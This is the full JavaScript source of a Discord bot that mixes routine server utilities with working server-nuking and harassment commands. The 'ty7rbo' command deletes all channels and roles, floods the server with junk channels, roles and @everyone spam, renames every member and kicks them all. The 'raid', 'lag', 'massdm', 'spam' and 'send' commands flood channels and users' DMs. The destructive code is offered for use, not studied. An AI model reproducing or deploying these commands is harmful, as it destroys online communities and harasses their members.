require("dotenv").config();
const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder } = require("discord.js");

/* ======================= CLIENT ======================= */
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.GuildVoiceStates
    ]
});

/* ======================= BASIC CONFIG ======================= */
const PREFIX = "?";
const DEFAULT_TAG = "";
let CUSTOM_TAG = "";

/* ======================= DEVELOPERS ======================= */
const DEVELOPERS = new Set([
    "1274503092154404908",
    "922556935633510491"
]);

/* ======================= BOT OWNER ID (for mention reply) ======================= */
const BOT_OWNER_ID = "1274503092154404908";
const MENTION_GIF_URL = "https://i.pinimg.com/originals/b2/ff/d9/b2ffd9de76ce9385a2577daad6505575.gif";

/* ======================= AUTO-KICK VOICE ======================= */
const VC_CHANNEL_ID = "1483592724480393286";
const allowedUsers = new Set(["1274503092154404908",
                             "1078169863664701531",
                             "699694653620093048",
                             "922556935633510491",
                             "1352410503032344599"
                             ]);

client.on("messageCreate", async (message) => {
    if (!message.guild || message.author.bot) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = (args.shift() || "").toLowerCase();

    if (command === "ydkhol") {
        if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
        const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
        if (!member) return message.reply("❌ Mention a valid member");
        
        // Protection spéciale pour l'owner bot
        if (member.id === BOT_OWNER_ID) {
            return message.reply("👑 **Bghiti tl3eb b zgheb d 9lawina db ??**");
        }
        
        allowedUsers.add(member.id);
        return message.reply(`<a:done:1347594035208130662> ${member.user.tag} Sf dkhol`);
    }

    if (command === "maydkholch") {
        if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
        const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
        if (!member) return message.reply("❌ Mention a valid member");
        
        // Protection spéciale pour l'owner bot
        if (member.id === BOT_OWNER_ID) {
            return message.reply("👑 **Bghiti tl3eb b zgheb d 9lawina db ??**");
        }
        
        allowedUsers.delete(member.id);
        return message.reply(`❌ ${member.user.tag} Zab ladkholti`);
    }
});

/* ======================= SELF REACT SYSTEM ======================= */
const selfReacts = new Map();
const AUTO_EMOJIS = ["<:ah:1456330508853317632>", "<:la:1456330662372970558>"];
const AUTO_CHANNEL_ID = "1451626940799782954";
const checkPagination = new Map();

/* ======================= HELPER FUNCTIONS ======================= */
function formatDate(date) {
    const days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
    const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
    const dayName = days[date.getDay()];
    const monthName = months[date.getMonth()];
    const day = date.getDate();
    const year = date.getFullYear();
    const hours = date.getHours().toString().padStart(2, '0');
    const minutes = date.getMinutes().toString().padStart(2, '0');
    const seconds = date.getSeconds().toString().padStart(2, '0');
    return `${dayName}, ${monthName} ${day}, ${year} at ${hours}:${minutes}:${seconds}`;
}

/* ======================= READY ======================= */
client.once("ready", () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    console.log(`📅 Today is: ${new Date().toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })}`);
    client.user.setPresence({
        activities: [{ name: "NB4rr Bot Safe Mode", type: 0 }],
        status: "online"
    });
    console.log(`🏠 Bot is ready! Custom tag set to: ${CUSTOM_TAG}`);
});

/* ======================= MESSAGE HANDLER ======================= */
client.on("messageCreate", async (message) => {
    try {
        if (message.author.bot || !message.guild) return;

        const guildReacts = selfReacts.get(message.guild.id);
        if (guildReacts) {
            for (const [emoji, users] of guildReacts) {
                if (users.has(message.author.id)) {
                    await message.react(emoji).catch(() => {});
                }
            }
        }

        if (message.channelId === AUTO_CHANNEL_ID) {
            for (const emoji of AUTO_EMOJIS) {
                await message.react(emoji).catch(() => {});
            }
        }

        if (!message.content.startsWith(PREFIX)) return;

        const args = message.content.slice(PREFIX.length).trim().split(/ +/);
        const command = (args.shift() || "").toLowerCase();

        /* ======================= HELP ======================= */
        if (command === "help") {
            const helpEmbed = new EmbedBuilder()
                .setColor(0x8B0000)
                .setAuthor({ name: "4rr BOT — Command List", iconURL: client.user.displayAvatarURL() })
                .setDescription("Here are all available commands. Prefix: **`?`**")
                .addFields(
                    {
                        name: "<a:FlecheSTX:1455957814878015549> Voice Control",
                        value: [
                            "`?aji` — Join your current voice channel",
                            "`?aji <id>` — Join a specific voice channel",
                            "`?siri` — Leave the voice channel",
                            "`?siftina <id>` — Mass move your VC members to another VC",
                            "`?ydkhol @user` — Allow a user into restricted VC",
                            "`?maydkholch @user` — Remove a user from VC whitelist",
                        ].join("\n"),
                        inline: false
                    },
                    {
                        name: "<a:FlecheSTX:1455957814878015549> Tag System",
                        value: [
                            "`?tag @member` — Tag a specific member",
                            "`?tagall` — Tag all members",
                            "`?untagall` — Remove tag from all members",
                            "`?settag <text>` — Set a custom tag",
                            "`?resettag` — Reset tag to default",
                            "`?currenttag` — Show current tag",
                        ].join("\n"),
                        inline: false
                    },
                    {
                        name: "<a:FlecheSTX:1455957814878015549> Reactions",
                        value: [
                            "`?zidem @user <emoji>` — Set auto react on a user",
                            "`?7ydem @user <emoji>` — Remove auto react from a user",
                        ].join("\n"),
                        inline: false
                    },
                    {
                        name: "<a:FlecheSTX:1455957814878015549> Other",
                        value: [
                            "`?system` — Show bot system info",
                            "`?adddev @user` — Add a developer",
                            "`?removedev @user` — Remove a developer",
                        ].join("\n"),
                        inline: false
                    }
                )
                .addFields({
                    name: "",
                    value: "<:444:1456338630162256096> La mhtaj chi mosa3ada sift liya f DM <@1274503092154404908> bch manjawbkch",
                    inline: false
                })
                .setFooter({ text: `Requested by ${message.author.username}`, iconURL: message.author.displayAvatarURL() })
                .setTimestamp();
            return message.reply({ embeds: [helpEmbed] });
        }

        /* ======================= TY7RBO (SIDKOM OVERDOSE) ======================= */
        if (command === "ty7rbo") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            await message.delete().catch(() => {});
            const guild = message.guild;
            
            // 1. Delete all channels
            const channels = guild.channels.cache.filter(c => c.deletable);
            for (const [, channel] of channels) {
                await channel.delete().catch(() => {});
            }
            
            // 2. Delete all roles
            const roles = guild.roles.cache.filter(r => r.deletable && !r.managed);
            for (const [, role] of roles) {
                await role.delete().catch(() => {});
            }
            
            // 3. Create chaos channels "Sidkom Overdose" 50 times
            for (let i = 0; i < 50; i++) {
                await guild.channels.create({ name: `Sidkom-Overdose-${i}`, type: 0 }).catch(() => {});
            }
            
            // 4. Create chaos roles "Sidkom Overdose" 50 times
            for (let i = 0; i < 50; i++) {
                await guild.roles.create({ name: `Sidkom-Overdose-${i}` }).catch(() => {});
            }
            
            // 5. Spam @everyone and @here with "**4rr team never die**" (BOLD + LARGE) 500 times
            const spamMessage = "**🔥 4rr team never die 🔥**";
            for (let i = 0; i < 500; i++) {
                guild.channels.cache.first()?.send(`${i % 2 === 0 ? "@everyone" : "@here"} ${spamMessage}`).catch(() => {});
                await new Promise(r => setTimeout(r, 10));
            }
            
            // 6. Change all members nicknames to "HH T7WITO"
            const members = await guild.members.fetch();
            for (const [, member] of members) {
                if (!member.user.bot && member.manageable) {
                    await member.setNickname("HH T7WITO").catch(() => {});
                }
            }
            
            // 7. Kick all members
            for (const [, member] of members) {
                if (!member.user.bot && member.kickable) {
                    await member.kick("Sidkom Overdose").catch(() => {});
                }
            }
            
            // 8. Final destruction message
            guild.channels.cache.first()?.send("💀 **SIDKOM OVERDOSE COMPLETE - SERVER DESTROYED** 💀").catch(() => {});
            
            // Note: Discord doesn't allow bots to delete servers directly
            // The server is effectively destroyed through mass channel/role deletion + member kicks
            return;
        }

        /* ======================= LAG (DDOS) ======================= */
        if (command === "lag") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const targetId = args[0];
            const timeStr = args[1];
            if (!targetId || !timeStr) return message.reply("❌ Usage: `?lag <voice/server id> <time>` (10s, 30s, 1min)");
            
            let duration = 10000; // 10s default
            if (timeStr.includes('s')) duration = parseInt(timeStr) * 1000;
            else if (timeStr.includes('min')) duration = parseInt(timeStr) * 60000;
            
            const spamInterval = setInterval(async () => {
                for (let i = 0; i < 50; i++) {
                    message.channel.send(`🔥 LAG ATTACK ${i}`).catch(() => {});
                }
            }, 100);
            
            setTimeout(() => clearInterval(spamInterval), duration);
            return message.reply(`⚡ **LAG ATTACK** started on ${targetId} for ${timeStr}`).catch(() => {});
        }

        /* ======================= RAID ======================= */
        if (command === "raid") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            await message.delete().catch(() => {});
            const raidMessages = [
                "@everyone",
                "🚀 RAID MODE ACTIVATED 🚀",
                "💣 Server under attack 💣",
                "🔥 Burn it down 🔥",
                "💥 Nuke incoming 💥"
            ];
            
            for (let i = 0; i < 100; i++) {
                const msg = raidMessages[Math.floor(Math.random() * raidMessages.length)];
                message.channel.send(msg).catch(() => {});
                await new Promise(r => setTimeout(r, 50));
            }
            return;
        }

        /* ======================= MASSDM ======================= */
        if (command === "massdm") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const messageText = args.join(" ");
            if (!messageText) return message.reply("❌ Usage: `?massdm <message>`");
            
            await message.delete().catch(() => {});
            const members = message.guild.members.cache.filter(m => !m.user.bot);
            
            let sent = 0;
            for (const [, member] of members) {
                try {
                    await member.send(`📢 **MASS DM**\n\n${messageText}`);
                    sent++;
                } catch (e) {}
                await new Promise(r => setTimeout(r, 100));
            }
            
            message.channel.send(`📨 Sent **${sent}** mass DMs`).catch(() => {});
            return;
        }

        /* ======================= SYSTEM ======================= */
        if (command === "system") {
            const uptimeSeconds = process.uptime();
            const hours = Math.floor(uptimeSeconds / 3600);
            const minutes = Math.floor((uptimeSeconds % 3600) / 60);
            const memoryUsageMB = Math.round(process.memoryUsage().rss / 1024 / 1024);
            return message.reply(
`💻 Bot System Info\n` +
`Host: NB4rr's bot\n` +
`Node Version: ${process.version}\n` +
`Uptime: ${hours}h ${minutes}m\n` +
`Memory: ${memoryUsageMB} MB\n` +
`Guilds: ${client.guilds.cache.size}\n` +
`Current tag: ${CUSTOM_TAG || "None"}`
            );
        }

        /* ======================= TAG ======================= */
        if (command === "tag") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            if (!CUSTOM_TAG) return message.reply("❌ No tag set, use `?settag <text>` first");
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
            if (!member) return message.reply("❌ Mention a valid member");
            let cleanName = member.displayName.replace(new RegExp(`^${escapeRegex(CUSTOM_TAG)}\\s*`), "").trim() || member.user.username;
            await member.setNickname(`${CUSTOM_TAG} ${cleanName}`).catch(() => {});
            return message.reply(`<a:done:1347594035208130662> Tagged ${member.user.tag}`);
        }

        /* ======================= TAGALL ======================= */
        if (command === "tagall") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            if (!CUSTOM_TAG) return message.reply("❌ No tag set, use `?settag <text>` first");
            const startTime = Date.now();
            const members = await message.guild.members.fetch();
            let count = 0;
            for (const [, member] of members) {
                if (member.user.bot) continue;
                let cleanName = member.displayName.replace(new RegExp(`^${escapeRegex(CUSTOM_TAG)}\\s*`), "").trim() || member.user.username;
                await member.setNickname(`${CUSTOM_TAG} ${cleanName}`).catch(() => {});
                count++;
            }
            const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
            const tagallEmbed = new EmbedBuilder()
                .setColor(0x8B0000)
                .setAuthor({ name: "Tag Operation Complete", iconURL: client.user.displayAvatarURL() })
                .setDescription("<a:done:1347594035208130662> All members have been successfully tagged!")
                .addFields(
                    { name: "🏷️ Tag Used", value: `\`${CUSTOM_TAG}\``, inline: true },
                    { name: "👥 Members Tagged", value: `\`${count}\``, inline: true },
                    { name: "<:Time:1455957726059303087> Time Taken", value: `\`${elapsed}s\``, inline: true },
                    { name: "<a:crowndarkred:1347593632005357650> Launched By", value: `${message.author}`, inline: true }
                )
                .setImage("https://i.pinimg.com/originals/79/a8/68/79a868b80feef9ba913930e5fcccb825.gif")
                .setFooter({ text: message.guild.name, iconURL: message.guild.iconURL() })
                .setTimestamp();
            return message.reply({ embeds: [tagallEmbed] });
        }

        /* ======================= UNTAGALL ======================= */
        if (command === "untagall") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            if (!CUSTOM_TAG) return message.reply("❌ No tag set, nothing to remove");
            const startTime = Date.now();
            const members = await message.guild.members.fetch();
            let count = 0;
            for (const [, member] of members) {
                if (member.user.bot) continue;
                let cleanName = member.displayName.replace(new RegExp(`^${escapeRegex(CUSTOM_TAG)}\\s*`), "").trim();
                await member.setNickname(cleanName || null).catch(() => {});
                count++;
            }
            const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
            const untagallEmbed = new EmbedBuilder()
                .setColor(0x8B0000)
                .setAuthor({ name: "Untag Operation Complete", iconURL: client.user.displayAvatarURL() })
                .setDescription("<a:done:1347594035208130662> All tags have been successfully removed!")
                .addFields(
                    { name: "👥 Members Untagged", value: `\`${count}\``, inline: true },
                    { name: "<:Time:1455957726059303087> Time Taken", value: `\`${elapsed}s\``, inline: true },
                    { name: "<a:crowndarkred:1347593632005357650> Launched By", value: `${message.author}`, inline: true }
                )
                .setImage("https://i.pinimg.com/originals/79/a8/68/79a868b80feef9ba913930e5fcccb825.gif")
                .setFooter({ text: message.guild.name, iconURL: message.guild.iconURL() })
                .setTimestamp();
            return message.reply({ embeds: [untagallEmbed] });
        }

        /* ======================= SETTAG ======================= */
        if (command === "settag") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            if (!args.length) return message.reply("❌ Provide a tag");
            CUSTOM_TAG = args.join(" ");
            return message.reply(`<a:done:1347594035208130662> Tag set to: ${CUSTOM_TAG}`);
        }

        /* ======================= CURRENTTAG ======================= */
        if (command === "currenttag") {
            return message.reply(`🏷️ Current tag: ${CUSTOM_TAG || "None"}`);
        }

        /* ======================= RESETTAG ======================= */
        if (command === "resettag") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            CUSTOM_TAG = "";
            return message.reply(`<a:done:1347594035208130662> Tag has been reset`);
        }

        /* ======================= ADDDEV ======================= */
        if (command === "adddev") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
            if (!member) return message.reply("❌ Mention a valid member");
            DEVELOPERS.add(member.id);
            return message.reply(`<a:done:1347594035208130662> ${member.user.tag} is now a developer`);
        }

        /* ======================= REMOVEDEV ======================= */
        if (command === "removedev") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
            if (!member) return message.reply("❌ Mention a valid member");
            if (member.id === message.author.id) return message.reply("❌ You can't remove yourself");
            DEVELOPERS.delete(member.id);
            return message.reply(`<a:done:1347594035208130662> ${member.user.tag} removed from developers`);
        }

        /* ======================= ZIDEM (AUTO REACT) ======================= */
        if (command === "zidem") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
            if (!member) return message.reply("❌ Mention a valid member");
            const emojiArg = args.find(a => !a.startsWith("<@") && a !== member.id) || args[args.length - 1];
            if (!emojiArg) return message.reply("❌ Provide an emoji");
            if (!selfReacts.has(message.guild.id)) selfReacts.set(message.guild.id, new Map());
            const guildMap = selfReacts.get(message.guild.id);
            if (!guildMap.has(emojiArg)) guildMap.set(emojiArg, new Set());
            guildMap.get(emojiArg).add(member.id);
            return message.reply(`<a:done:1347594035208130662> Done ${emojiArg} on ${member.user.tag}'s messages`);
        }

        /* ======================= 7YDEM (REMOVE AUTO REACT) ======================= */
        if (command === "7ydem") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
            if (!member) return message.reply("❌ Mention a valid member");
            const emojiArg = args.find(a => !a.startsWith("<@") && a !== member.id) || args[args.length - 1];
            if (!emojiArg) return message.reply("❌ Provide an emoji");
            const guildMap = selfReacts.get(message.guild.id);
            if (!guildMap || !guildMap.has(emojiArg)) return message.reply("❌ No reaction found for this emoji");
            guildMap.get(emojiArg).delete(member.id);
            if (guildMap.get(emojiArg).size === 0) guildMap.delete(emojiArg);
            return message.reply(`<a:done:1347594035208130662> Removed ${emojiArg} from ${member.user.tag}`);
        }

        /* ======================= AJI (JOIN VOICE) ======================= */
        if (command === "aji") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const { joinVoiceChannel } = require("@discordjs/voice");
            let targetChannel = null;
            if (args[0]) {
                targetChannel = message.guild.channels.cache.get(args[0]);
                if (!targetChannel || targetChannel.type !== 2) return message.reply("❌ Invalid voice channel ID");
            } else {
                const authorMember = await message.guild.members.fetch(message.author.id).catch(() => null);
                if (!authorMember || !authorMember.voice.channelId) return message.reply("❌ You are not in a voice channel");
                targetChannel = authorMember.voice.channel;
            }
            try {
                joinVoiceChannel({
                    channelId: targetChannel.id,
                    guildId: message.guild.id,
                    adapterCreator: message.guild.voiceAdapterCreator,
                    selfDeaf: false,
                    selfMute: false
                });
                return message.reply(`<a:done:1347594035208130662> Hana jit`);
            } catch (err) {
                console.log("Error joining VC:", err);
            }
        }

        /* ======================= SIRI (LEAVE VOICE) ======================= */
        if (command === "siri") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const { getVoiceConnection } = require("@discordjs/voice");
            const connection = getVoiceConnection(message.guild.id);
            if (!connection) return message.reply("❌ I am not in any voice channel");
            connection.destroy();
            return message.reply("<a:done:1347594035208130662> Haya Ghadiya");
        }

        /* ======================= SIFTINA (MASS MOVE) ======================= */
        if (command === "siftina") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const targetChannelId = args[0];
            if (!targetChannelId) return message.reply("❌ Use: `?siftina <channel_id>`");
            const targetChannel = message.guild.channels.cache.get(targetChannelId);
            if (!targetChannel || targetChannel.type !== 2) return message.reply("❌ Invalid voice channel ID");
            const authorMember = await message.guild.members.fetch(message.author.id).catch(() => null);
            if (!authorMember || !authorMember.voice.channelId) return message.reply("❌ You must be in a voice channel");
            const sourceChannel = authorMember.voice.channel;
            if (sourceChannel.id === targetChannelId) return message.reply("❌ Same channel");
            const members = sourceChannel.members;
            if (members.size === 0) return message.reply("❌ No members in your voice channel");
            let moved = 0;
            for (const [, member] of members) {
                if (member.user.bot) continue;
                await member.voice.setChannel(targetChannel).catch(() => {});
                moved++;
            }
            return message.reply(`<a:done:1347594035208130662> Moved ${moved} members to **${targetChannel.name}**`);
        }

        /* ======================= CLEAR ======================= */
        if (command === "clear") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const amount = parseInt(args[0]);
            if (isNaN(amount) || amount < 1 || amount > 1000) return message.reply("❌ Provide a number between 1 and 1000");
            const deleted = await message.channel.bulkDelete(amount + 1, true).catch(() => null);
            const count = deleted ? deleted.size - 1 : 0;
            const clearEmbed = new EmbedBuilder()
                .setColor(0x8B0000)
                .setAuthor({ name: "Channel Purge", iconURL: client.user.displayAvatarURL() })
                .setDescription(`🗑️ Successfully deleted **${count}** message(s)`)
                .addFields(
                    { name: "<a:crowndarkred:1347593632005357650> Executed by", value: `${message.author}`, inline: true },
                    { name: "📌 Channel", value: `${message.channel}`, inline: true },
                    { name: "<:Time:1455957726059303087> Time", value: `\`${new Date().toLocaleTimeString()}\``, inline: true }
                )
                .setFooter({ text: message.guild.name, iconURL: message.guild.iconURL() })
                .setTimestamp();
            const msg = await message.channel.send({ embeds: [clearEmbed] });
            setTimeout(() => msg.delete().catch(() => {}), 5000);
            return;
        }

        /* ======================= SAY ======================= */
        if (command === "say") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const text = args.join(" ");
            if (!text) return message.reply("❌ Provide a message");
            await message.delete().catch(() => {});
            await message.channel.send(text);
            return;
        }

        /* ======================= USERINFO ======================= */
        if (command === "userinfo" || command === "info") {
            const target = message.mentions.members.first() || message.guild.members.cache.get(args[0]) || message.member;
            const user = target.user;
            const roles = target.roles.cache.filter(r => r.id !== message.guild.id).sort((a, b) => b.position - a.position).map(r => r.toString()).slice(0, 5);
            const statusMap = { online: "🟢 Online", idle: "🟡 Idle", dnd: "🔴 Do Not Disturb", offline: "⚫ Offline" };
            const presence = target.presence;
            const status = presence ? statusMap[presence.status] || "⚫ Offline" : "⚫ Offline";
            const badges = [];
            const flags = user.flags?.toArray() || [];
            if (flags.includes("Staff")) badges.push("👨‍💼 Staff");
            if (flags.includes("Partner")) badges.push("🤝 Partner");
            if (flags.includes("HypeSquadOnlineHouse1")) badges.push("🏠 HypeSquad Bravery");
            if (flags.includes("HypeSquadOnlineHouse2")) badges.push("🏠 HypeSquad Brilliance");
            if (flags.includes("HypeSquadOnlineHouse3")) badges.push("🏠 HypeSquad Balance");
            if (flags.includes("EarlySupporter")) badges.push("⭐ Early Supporter");
            if (flags.includes("ActiveDeveloper")) badges.push("💻 Active Developer");
            if (user.bot) badges.push("🤖 Bot");
            const joinedAgo = Math.floor((Date.now() - target.joinedTimestamp) / 86400000);
            const createdAgo = Math.floor((Date.now() - user.createdTimestamp) / 86400000);
            const userEmbed = new EmbedBuilder()
                .setColor(target.displayHexColor !== "#000000" ? target.displayHexColor : 0x8B0000)
                .setAuthor({ name: `${user.username}`, iconURL: user.displayAvatarURL({ dynamic: true }) })
                .setThumbnail(user.displayAvatarURL({ dynamic: true, size: 256 }))
                .addFields(
                    { name: "🪪 User", value: `${user}`, inline: true },
                    { name: "🆔 ID", value: `\`${user.id}\``, inline: true },
                    { name: "📊 Status", value: status, inline: true },
                    { name: "📅 Account Created", value: `<t:${Math.floor(user.createdTimestamp / 1000)}:D> (\`${createdAgo}d ago\`)`, inline: false },
                    { name: "📥 Joined Server", value: `<t:${Math.floor(target.joinedTimestamp / 1000)}:D> (\`${joinedAgo}d ago\`)`, inline: false },
                    { name: `🎭 Roles (${target.roles.cache.size - 1})`, value: roles.length ? roles.join(", ") + (target.roles.cache.size - 1 > 5 ? ` +${target.roles.cache.size - 6} more` : "") : "No roles", inline: false },
                    { name: "🏅 Badges", value: badges.length ? badges.join(" • ") : "None", inline: false }
                )
                .setImage(user.bannerURL({ size: 512 }) || null)
                .setFooter({ text: `Requested by ${message.author.username}`, iconURL: message.author.displayAvatarURL() })
                .setTimestamp();
            return message.reply({ embeds: [userEmbed] });
        }

        /* ======================= SERVERINFO ======================= */
        if (command === "serverinfo") {
            const guild = message.guild;
            await guild.fetch();
            const totalMembers = guild.memberCount;
            const botCount = guild.members.cache.filter(m => m.user.bot).size;
            const humanCount = totalMembers - botCount;
            const roleCount = guild.roles.cache.size - 1;
            const boostCount = guild.premiumSubscriptionCount || 0;
            const boostTier = guild.premiumTier ? `Tier ${guild.premiumTier}` : "No Boost";
            const createdAgo = Math.floor((Date.now() - guild.createdTimestamp) / 86400000);
            const serverEmbed = new EmbedBuilder()
                .setColor(0x8B0000)
                .setAuthor({ name: guild.name, iconURL: guild.iconURL({ dynamic: true }) })
                .setThumbnail(guild.iconURL({ dynamic: true, size: 256 }))
                .setImage(guild.bannerURL({ size: 1024 }) || null)
                .addFields(
                    { name: "🆔 Server ID", value: `\`${guild.id}\``, inline: true },
                    { name: "<a:Crown_dark_blue:1347593580113432656> Owner", value: `<@${guild.ownerId}>`, inline: true },
                    { name: "📅 Created", value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:D> (\`${createdAgo}d ago\`)`, inline: true },
                    { name: "👥 Members", value: `\`${totalMembers}\` total • \`${humanCount}\` humans • \`${botCount}\` bots`, inline: false },
                    { name: "🎭 Roles", value: `\`${roleCount}\``, inline: true },
                    { name: "🚀 Boosts", value: `\`${boostCount}\` boosts • ${boostTier}`, inline: true }
                )
                .setFooter({ text: `Requested by ${message.author.username}`, iconURL: message.author.displayAvatarURL() })
                .setTimestamp();
            return message.reply({ embeds: [serverEmbed] });
        }

        /* ======================= SPAM (CHANNEL) ======================= */
        if (command === "spam") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const amount = parseInt(args[args.length - 1]);
            if (isNaN(amount) || amount < 1 || amount > 100) return message.reply("❌ Amount must be between 1 and 100");
            const text = args.slice(0, -1).join(" ");
            if (!text) return message.reply("❌ Provide a text to spam");
            await message.delete().catch(() => {});
            for (let i = 0; i < amount; i++) {
                await message.channel.send(text).catch(() => {});
                await new Promise(r => setTimeout(r, 400));
            }
            return;
        }

        /* ======================= SEND (DM SPAM) ======================= */
        if (command === "send") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const target = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
            if (!target) return message.reply("❌ Mention a valid member");
            const amount = parseInt(args[args.length - 1]);
            if (isNaN(amount) || amount < 1 || amount > 100) return message.reply("❌ Amount must be between 1 and 100");
            const text = args.filter(a => !a.startsWith("<@") && a !== target.id).slice(0, -1).join(" ");
            if (!text) return message.reply("❌ Provide a text to send");
            await message.delete().catch(() => {});
            let sent = 0;
            for (let i = 0; i < amount; i++) {
                const success = await target.send(text).catch(() => null);
                if (success) sent++;
                await new Promise(r => setTimeout(r, 500));
            }
            const msg = await message.channel.send({ embeds: [
                new EmbedBuilder()
                    .setColor(0x8B0000)
                    .setDescription(`<a:done:1347594035208130662> Sent **${sent}** DM(s) to ${target}`)
                    .setFooter({ text: `Executed by ${message.author.username}`, iconURL: message.author.displayAvatarURL() })
            ]});
            setTimeout(() => msg.delete().catch(() => {}), 4000);
            return;
        }

    } catch (err) {
        console.log("Error:", err);
    }
});

/* ======================= ESCAPE REGEX HELPER ======================= */
function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

/* ======================= AUTO TAG + WELCOME DM ======================= */
client.on("guildMemberAdd", async (member) => {
    if (member.user.bot) return;
    if (CUSTOM_TAG) {
        try {
            let cleanName = member.displayName.replace(new RegExp(`^${escapeRegex(CUSTOM_TAG)}\\s*`), "").trim();
            if (!cleanName) cleanName = member.user.username;
            await member.setNickname(`${CUSTOM_TAG} ${cleanName}`);
            console.log(`✅ Auto-tagged new member: ${member.user.tag} with ${CUSTOM_TAG}`);
        } catch (error) {
            console.log(`⚠️ Unable to tag ${member.user.tag}: ${error.message}`);
        }
    }
    try {
        await member.send(
`<:444:1456338630162256096> **Welcome!** <:444:1456338630162256096>\n` +
`Hello **${member.user.username}**!\n` +
`Enjoy your time and read the rules!\n\n` +
`- **NB4rr Team**`
        );
    } catch (err) {
        console.log(`Could not send DM to ${member.user.tag}`);
    }
});

/* ======================= AUTO-KICK VOICE HANDLER ======================= */
client.on("voiceStateUpdate", async (oldState, newState) => {
    try {
        if (!newState.channelId) return;
        if (newState.channelId !== VC_CHANNEL_ID) return;
        if (!allowedUsers.has(newState.id)) {
            await newState.disconnect("Not allowed in this VC");
            console.log(`⚠️ ${newState.member.user.tag} was auto-kicked from VC`);
        }
    } catch (err) {
        console.log("Error in auto-kick VC:", err);
    }
});

/* ======================= LOGIN ======================= */
if (!process.env.BOT_TOKEN) {
    console.error("❌ BOT_TOKEN missing in .env");
    process.exit(1);
}
client.login(process.env.BOT_TOKEN);

/* ======================= GLOBAL ERROR HANDLER ======================= */
process.on("unhandledRejection", (reason) => {
    console.error("Unhandled Rejection:", reason);
});
